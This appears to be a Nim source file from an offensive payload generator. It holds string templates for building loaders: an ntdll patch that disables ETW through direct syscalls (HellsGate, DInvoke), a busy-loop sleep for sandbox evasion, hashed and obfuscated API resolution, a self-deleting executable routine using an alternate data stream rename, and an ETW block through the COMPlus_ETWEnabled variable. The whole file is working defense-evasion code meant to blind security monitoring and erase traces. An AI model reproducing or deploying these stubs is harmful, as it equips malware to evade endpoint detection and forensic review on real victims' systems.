        if (success != 0):
            when defined(verbose):
                echo obf("NtProtectVirtualMemory failed")
            return disabled
        when defined(verbose):
            echo obf("[*] Applying Syscall ETW patch")

        when defined(HellsGate):
            if getSyscall(ntWriteTable):
                syscall = ntWriteTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
        var outLength: SIZE_T
    
        success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
    
        if (success != 0):
            when defined(verbose):
                echo obf("NtWriteVirtualMemory failed")
            return disabled
        
        when defined(HellsGate):
            if getSyscall(ntProtectTable):
                syscall = ntProtectTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        success =  NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
        if (success != 0):
            when defined(verbose):
                echo obf("NtProtectVirtualMemory failed")
            return disabled
        else:
            when defined(verbose):
                echo obf("[*] OldProtect set back")
            disabled = true
        
        when defined(GetSyscallStub):
            when defined(DInvoke):
                success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
            else:
                success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
            # Fails for some reason
            #success = NtProtectVirtualMemory(pHandle,addr syscallStub_NtProtect,addr friendlycodeLength,PAGE_READWRITE,addr op)
            when defined(verbose):
                echo obf("[*] Restored Stub protections: ") & $success

    return disabled

when isMainModule:
    success = Patchntdll()
    when defined(verbose):
        echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"
"""

let SleepStubFirst * = fmt"""
# Credit to @WhyDee86 - https://twitter.com/WhyDee86 for this sleep implementation

import random
import times

type Node = ref object
  x, y: int32
  left, right: Node

template newNode(value: int32): Node =
  Node(x: value, y: rand(high int32).int32)

proc merge(lower, greater: Node, res: var Node) =
  if lower.isNil:
    res = greater
  elif greater.isNil:
    res = lower
  elif lower.y < greater.y:
    res = lower
    merge(lower.right, greater, lower.right)
  else:
    res = greater
    merge(lower, greater.left, greater.left)

template merge(lower, equal, greater: Node, res: var Node) =
  merge(lower, equal, res)
  merge(res, greater, res)

proc splitBinary(orig: Node, lower, equalGreater: var Node, value: int32) =
  if orig.isNil:
    lower = nil
    equalGreater = nil
  elif orig.x < value:
    lower = orig
    splitBinary(lower.right, lower.right, equalGreater, value)
  else:
    equalGreater = orig
    splitBinary(equalGreater.left, lower, equalGreater.left, value)

template split(orig: Node, value: int32, lower, equal, greater: var Node) =
  var equalGreater: Node
  splitBinary(orig, lower, equalGreater, value)
  splitBinary(equalGreater, equal, greater, value + 1)

type Tree = object
  root: Node

template hasValue(self: var Tree, x: int32): bool =
  var lower, equal, greater: Node
  split(self.root, x, lower, equal, greater)
  let ret = not equal.isNil
  merge(lower, equal, greater, self.root)
  ret

template insert(self: var Tree, x: int32) =
  var lower, equal, greater: Node
  split(self.root, x, lower, equal, greater)
  if equal.isNil:
    equal = newNode(x)
  merge(lower, equal, greater, self.root)

template erase(self: var Tree, x: int32) =
  var lower, equal, greater: Node
  split(self.root, x, lower, equal, greater)
  merge(lower, greater, self.root)

proc Calc * () =
  randomize()
  var
    tree = Tree()
    cur = 5'i32
    res = 0'i32
#2500000 = 12-14sec
  for i in 1'i64 ..< 500000'i64:
    #echo i
    let a = i mod 3
    cur = (cur * 57 + 43) mod 10007
    case a:
    of 0:
      tree.insert(cur)
    of 1:
      tree.erase(cur)
    of 2:
      if tree.hasValue(cur):
        res += 1
    else:
      discard

  #echo res

proc HowMuchTimeWouldYoulikeToSleep * (sec : int) = 
  var interval = 0
  let t0 = getTime()
  Calc()
  #echo "First run Done"
  var delta = getTime() - t0
  while delta.inSeconds() < sec:
      interval += 1
      #echo "Round: ",interval
      #echo delta.inSeconds()," Seconds out of: " , sec
      Calc()
      delta = getTime() - t0
  #echo delta.inSeconds()," Seconds"
"""

let DInvokeSelfDeleteStubs * = """

const
  SHLWAPI_DLL* = obf("shlwapi.dll")


type
  CreateFileW_t* = proc (lpFileName: LPCWSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.stdcall.}
  SetFileInformationByHandle_t* = proc (hFile: HANDLE, FileInformationClass: FILE_INFO_BY_HANDLE_CLASS, lpFileInformation: LPVOID, dwBufferSize: DWORD): WINBOOL {.stdcall.}
  GetModuleFileNameW_t* = proc (hModule: HMODULE, lpFilename: LPWSTR, nSize: DWORD): DWORD {.stdcall.}
  CloseHandle_t* = proc (hObject: HANDLE): WINBOOL {.stdcall.}
  PathFileExistsW_t* = proc (pszPath: LPCWSTR): WINBOOL {.stdcall.}

const
  CreateFileW_HASH * = obf("CreateFileW")
  SetFileInformationByHandle_HASH * = obf("SetFileInformationByHandle")
  GetModuleFileNameW_HASH * = obf("GetModuleFileNameW")
  CloseHandle_HASH * = obf("CloseHandle")
  PathFileExistsW_HASH * = obf("PathFileExistsW")

var MyCreateFileW*: CreateFileW_t
var MySetFileInformationByHandle*: SetFileInformationByHandle_t
var MyGetModuleFileNameW*: GetModuleFileNameW_t
var MyCloseHandle*: CloseHandle_t
var MyPathFileExistsW*: PathFileExistsW_t


# temporary workaround, as the ordinal changes between OS Versions and the relative address via DInvoke is wrong.
var shlwapi = MyLoadLibraryA(obf("shlwapi.dll"))
if (shlwapi == 0):
    when defined(verbose):
        echo obf("[X] Failed to load shlwapi.dll")

var pathfileExistsAddress = MyGetProcAddress(shlwapi,obf("PathFileExistsW"))
if isNil(pathfileExistsAddress):
    when defined(verbose):
        echo obf("[X] Failed to get the address of 'PathFileExistsW'")


MyCreateFileW = cast[CreateFileW_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileW_HASH, 0, FALSE)))

MySetFileInformationByHandle = cast[SetFileInformationByHandle_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), SetFileInformationByHandle_HASH, 0, FALSE)))

MyGetModuleFileNameW = cast[GetModuleFileNameW_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleFileNameW_HASH, 0, FALSE))

MyCloseHandle = cast[CloseHandle_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CloseHandle_HASH, 0, FALSE))

# Works but potentially the ordinal could change later on - this lead to bugs
#MyPathFileExistsW = cast[PathFileExistsW_t](get_function_address(cast[HMODULE](get_library_address(SHLWAPI_DLL, TRUE)), "", 669, FALSE))
# Doesn't work, as the relative address is not correct. All those Ordinal functions are ignored maybe? Have to troubleshoot
#MyPathFileExistsW = cast[PathFileExistsW_t](get_function_address(cast[HMODULE](get_library_address(SHLWAPI_DLL, TRUE)), PathFileExistsW_HASH, 0, FALSE))
MyPathFileExistsW = cast[PathFileExistsW_t](pathfileExistsAddress)
"""

let FileDeleteStub * = """

#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r, slight modifications by @ShitSecure
    License: BSD 3-Clause
    Credit to @jonasLyk for the discovery of this method and LloydLabs for the initial C PoC code.
    References:
        - https://github.com/LloydLabs/delete-self-poc
        - https://twitter.com/jonasLyk/status/1350401461985955840
]# 

# Don't want to import the everything from winim, only what's really needed
from winim import PWCHAR,HANDLE,DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,WINBOOL,FILE_RENAME_INFO,LPWSTR,DWORD,fileRenameInfo,FILE_DISPOSITION_INFO,TRUE
from winim import fileDispositionInfo,MAX_PATH,WCHAR,INVALID_HANDLE_VALUE

template RtlSecureZeroMemory*(Destination: PVOID, Length: SIZE_T) = zeroMem(Destination, Length)
template RtlCopyMemory*(Destination: PVOID, Source: PVOID, Length: SIZE_T) = copyMem(Destination, Source, Length)

proc PathFileExistsW*(pszPath: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "shlwapi", importc.}

var DS_STREAM_RENAME = newWideCString(obf(":thiswontexist"))

proc ds_open_handle(pwPath: PWCHAR): HANDLE =
    when defined(DInvoke): 
        return MyCreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
    else:
        return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)

proc ds_rename_handle(hHandle: HANDLE): WINBOOL =
    var fRename: FILE_RENAME_INFO
    RtlSecureZeroMemory(addr fRename, sizeof(fRename))

    var lpwStream: LPWSTR = cast[LPWSTR](DS_STREAM_RENAME)
    fRename.FileNameLength = sizeof(lpwStream).DWORD
    RtlCopyMemory(addr fRename.FileName, lpwStream, sizeof(lpwStream))

    when defined(DInvoke):
        return MySetFileInformationByHandle(hHandle, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream))
    else:
        return SetFileInformationByHandle(hHandle, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream))

proc ds_deposite_handle(hHandle: HANDLE): WINBOOL =
    var fDelete: FILE_DISPOSITION_INFO
    RtlSecureZeroMemory(addr fDelete, sizeof(fDelete))

    fDelete.DeleteFile = TRUE

    when defined(DInvoke):
        return MySetFileInformationByHandle(hHandle, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint)
    else:
        return SetFileInformationByHandle(hHandle, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint)

when isMainModule:
    var
        wcPath: array[MAX_PATH + 1, WCHAR]
        hCurrent: HANDLE

    RtlSecureZeroMemory(addr wcPath[0], sizeof(wcPath))

    when defined(DInvoke):
        if MyGetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
            when defined(verbose):
                echo obf("[-] Failed to get the current module handle")
            quit(QuitFailure)
    else:
        if GetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
            when defined(verbose):
                echo obf("[-] Failed to get the current module handle")
            quit(QuitFailure)

    hCurrent = ds_open_handle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        when defined(verbose):
            echo obf("[-] Failed to acquire handle to current running process")
        quit(QuitFailure)

    when defined(verbose):
        echo obf("[*] Attempting to rename file name")
    if not ds_rename_handle(hCurrent).bool:
        when defined(verbose):
            echo obf("[-] Failed to rename to stream")
        quit(QuitFailure)

    when defined(verbose):
        echo obf("[*] Successfully renamed file primary :$DATA ADS to specified stream, closing initial handle")
    when defined(DInvoke):
        discard MyCloseHandle(hCurrent)
    else:
        discard CloseHandle(hCurrent)

    hCurrent = ds_open_handle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        when defined(verbose):
            echo obf("[-] Failed to reopen current module")
        quit(QuitFailure)

    if not ds_deposite_handle(hCurrent).bool:
        when defined(verbose):
            echo obf("[-] Failed to set delete deposition")
        quit(QuitFailure)

    when defined(verbose):
        echo obf("[*] Closing handle to trigger deletion deposition")
    when defined(DInvoke):
        discard MyCloseHandle(hCurrent)
    else:
        discard CloseHandle(hCurrent)

    when defined(DInvoke):
        if not MyPathFileExistsW(addr wcPath[0]).bool:
            when defined(verbose):
                echo obf("[*] File deleted successfully")
    else:
        if not PathFileExistsW(addr wcPath[0]).bool:
            when defined(verbose):
                echo obf("[*] File deleted successfully")

"""



let ETWCOMVARStub * = """
proc BlockETW(): bool =
    # Disable ETW via https://blog.xpnsec.com/hiding-your-dotnet-complus-etwenabled/
    var cometw: string = obf("COMPlus_ETWEnabled")
    var setnull: string = "0"
    putenv(cometw, setnull)
    return true

when isMainModule:
    var success = BlockETW()
    when defined(verbose):
        echo obf("[*] ETW blocked by COMPLUS_ETWEnabled variable: ") & fmt"{bool(success)}"
"""
